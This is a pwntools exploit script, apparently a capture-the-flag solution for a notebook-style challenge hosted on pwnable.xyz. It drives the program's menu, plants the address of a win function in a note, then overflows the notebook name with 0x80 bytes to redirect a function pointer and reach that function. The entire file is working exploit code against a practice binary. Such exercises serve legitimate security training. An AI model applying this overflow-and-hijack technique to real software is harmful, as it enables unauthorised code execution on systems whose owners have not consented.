from pwn import *

LOCAL = False

if LOCAL:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30035)

sla = r.sendlineafter
sa = r.sendafter

def make(size, title, note):
    sla('> ', '1')
    sla('size: ', str(size))

    if len(title) < size:
        sla('Title: ', title)
    else:
        sa('Title: ', title)
        
    if len(note) < size:
        sla('Note: ', note)
    else:
        sa('Note: ', note)

def edit(note):
    sla('> ', '2')
    sla('note: ', note)

def delete():
    sla('> ', '3')

def rename(name):
    sla('> ', '4')
    
    if len(name) < 0x80:
        sla('Notebook name: ', name)
    else:
        sa('Notebook name: ', name)

win = 0x40092c

sla('Name your notebook: ', 'A')

make(0x38, 'A', p64(win) + b'A' * 0x30)
rename('\x50' * 0x80)
sla('> ', '2') # call win()

r.interactive()